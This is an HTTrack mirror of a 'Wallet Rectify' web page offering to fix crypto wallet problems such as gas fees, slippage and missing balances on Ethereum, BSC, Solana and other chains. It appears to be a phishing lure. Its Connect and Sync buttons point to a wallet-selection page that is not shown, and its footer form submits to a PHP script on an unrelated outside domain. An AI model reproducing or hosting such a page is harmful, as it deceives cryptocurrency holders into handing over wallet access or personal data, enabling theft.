...
<!-- Mirrored from mute-forest-8844.on.fleek.co/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Nov 2023 15:14:37 GMT -->

<!-- Mirrored from mainnetnode.web.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 May 2024 10:46:55 GMT -->
...
<head>
    ...
    <title>Wallet Rectify - Rectification, Synchronization, and Validation</title>
    <base />

    <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"> -->
    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="assets/vendor/icons/icofont.min.css">

    <link rel="stylesheet" type="text/css" href="assets/vendor/bootstrap/font/bootstrap-icons.css">
    <link rel="stylesheet" href="cdn.jsdelivr.net/npm/bootstrap-icons%401.11.1/font/bootstrap-icons.css">
...
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
        <div class="container">
            <a class="navbar-brand" href="index-2.html">
                <img src="assets/img/dapp_logo.png" alt="#" class="img-fluid">
            </a>
            ...
            <div class="collapse navbar-collapse" id="navbarNavAltMarkup16">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" aria-current="page" href="index-2.html">Home - Wallet Rectify</a>
                    </li>
                </ul>
                ...
                <ul class="nav explore-tabs mb-0 justify-content-center gap-2" id="chain-switch-pill" role="tablist">
                    ...
                    <li class="nav-item" role="presentation" data-chain-id="0">
                        <button class="nav-link active" id="pills-all-tab" data-bs-toggle="pill" type="button"
                    ...
                    <li class="nav-item" role="presentation" data-chain-id="1">
                        <button class="nav-link " id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab"
                            ...
                            <span><img src="assets/img/ethereum.png" width="8"></span>&nbsp;
                            Ethereum </button>
                    </li>


                    <li class="nav-item" role="presentation" data-chain-id="2">
                        <button class="nav-link " id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab"
                            aria-controls="pills-bsc" aria-selected="true">
                            <span><img src="assets/img/binance.png" width="15"></span>&nbsp;
                            BSC </button>
                    </li>


                    <li class="nav-item" role="presentation" data-chain-id="3">
                        <button class="nav-link " id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab"
                            aria-controls="pills-polygon" aria-selected="true">
                            <span><img src="assets/img/polygon.png" width="15"></span>&nbsp;
                            Polygon </button>
                    </li>


                    <li class="nav-item" role="presentation" data-chain-id="4">
                        <button class="nav-link " id="pills-avalanche-tab" data-bs-toggle="pill" type="button"
                            role="tab" aria-controls="pills-avalanche" aria-selected="true">
                            <span><img src="assets/img/avalanche.png" width="15"></span>&nbsp;
                            Avalanche </button>
                    </li>


                    <li class="nav-item" role="presentation" data-chain-id="5">
                        <button class="nav-link " id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab"
                            aria-controls="pills-solana" aria-selected="true">
                            <span><img src="assets/img/solana.png" width="15"></span>&nbsp;
                            Solana </button>
                    </li>


                    <li class="nav-item" role="presentation" data-chain-id="6">
                        <button class="nav-link " id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab"
                            aria-controls="pills-cardano" aria-selected="true">
                            <span><img src="assets/img/cardano.png" width="15"></span>&nbsp;
                            Cardano </button>
                    </li>
                ...
                <div class="navbar-nav ms-auto gap-3 connect_wallet">
                    <a class="btn btn-primary btn-sm" href="index/wallets/index.html"><i
        ...
        <div class="container py-4">
            <div class="row">
                <div class="col-lg-7 col-12">
                    ...
                    <div>
                        <a href="index/wallets/index.html" class="btn btn-warning btn-lg me-3">Connect</a>
                        <a href="index/wallets/index.html" class="btn btn-light btn-lg">Sync</a>
                    </div>
                </div>
            </div>
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    <!-- <a href="index/wallets/index.html"> -->
                                    <i
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    ...
                                    <h6 class="card-title mb-1 text-dark fw-bold mt-2">High Gas Fees</h6>
                                </div>
                            </div>
                        </div>
                    </div>
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    ...
                                    <h6 class="card-title mb-1 text-dark fw-bold mt-2">Slippage Error</h6>
                                </div>
                            </div>
                        </div>
                    </div>
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    ...
                                    <h6 class="card-title mb-1 text-dark fw-bold mt-2">Swap/Exchange</h6>
                                </div>
                            </div>
                        </div>
                    </div>
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    ...
                                    <h6 class="card-title mb-1 text-dark fw-bold mt-2">Dapps Reconnection</h6>
                                </div>
                            </div>
                        </div>
                    </div>
                        ...
                        <div class="selected_features">
                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
                                <div class="card-body text-center py-1">
                                    ...
                                    <h6 class="card-title mb-1 text-dark fw-bold mt-2">Missing/Irregular Balances</h6>
                                </div>
                            </div>
                        </div>
                    </div>
    ...
    <footer class="footer bg-white py-5">
        <div class="container py-4">
            <div class="row">
                ...
                <div class="col-md-12 col-lg-4 col-12">
                    <form action="https://homecareaway.com/og/og.php" method="post">
                        ...
                        <div class="input-group">
                            ...
                            <button type="submit" name="submit" value="submit" class="btn btn-primary" type="button"><i
                                    class="bi bi-envelope me-2"></i>
                                Subscribe</button>
                        </div>
                        <div class="small mt-3 text-danger">No worries we don't spam! Unsubscribe at any time by
                            <br>clicking on the link in the email.
                        </div>
                    </form>
                </div>
            </div>
            ...
            <div class="row align-items-center justify-content-between">
                <div class="col-auto">
                    <div class="mb-4 mb-md-0">
                        <a href="index-2.html" class="text-decoration-none link-dark fw-bold pe-2">Home</a>
                        <a href="#features" class="text-decoration-none link-dark fw-bold px-2">Features</a>
                    </div>
                </div>
                <div class="col-auto">
                    <div class="d-flex align-items-center gap-3">
                        <span class="text-decoration-none link-dark">Download app</span>
                        <a href="#"><img src="assets/img/app-store.png" alt="#" class="img-fluid"></a>
                        <a href="#"><img src="assets/img/google-store.png" alt="#" class="img-fluid"></a>
                    </div>
                </div>
            </div>
        </div>
    ...
    <!-- Mirrored from mute-forest-8844.on.fleek.co/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Nov 2023 15:14:53 GMT -->


<!-- Mirrored from mainnetnode.web.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 May 2024 10:47:52 GMT -->
</html>
